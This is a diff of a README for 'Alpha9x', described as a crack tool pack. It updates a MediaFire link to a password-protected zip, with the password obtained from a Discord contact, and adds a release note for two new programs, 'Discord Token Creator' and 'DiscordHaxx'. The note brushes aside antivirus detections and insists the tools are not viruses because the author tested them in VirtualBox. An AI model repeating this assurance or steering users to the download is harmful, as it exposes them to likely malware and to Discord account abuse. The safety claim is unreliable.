@@ -13,14 +13,23 @@ Contact Fludix on Discord for the Password:
 Fludix#0453
 ```
 
-[Alpha9x v.1.56](https://www.mediafire.com/file/lwf7v702ah9r2y3/Alpha9x-V.1.56.zip)
+[Alpha9x v.2.56](https://www.mediafire.com/file/vst8m5w59iwmotk/Alpha9x_v2.56.zip)
 -----------------
 
 -----------------
 ### $|> Information:
 
-13/04/21 // 03:05 AM in Germany:
+# 27/04/21 // 09:01 PM in Germany:
+Alpha9x Version 2.56 is now out!
+The new Programs are Discord Token Creator
+and DiscordHaxx. FYI: It says that it is
+a "virus" with DiscordHaxx and Discord Token
+Creator, but they aren't viruses as I tested them out.
+I always test the new programs on my VirtualBox, so I can
+keep my Customers safe!
+-END-
 
+# 13/04/21 // 03:05 AM in Germany:
 Alpha9x is ready to be released!
 I have finally finished it's goodies!
 Alpha9x is basically a Crack Tool Pack which
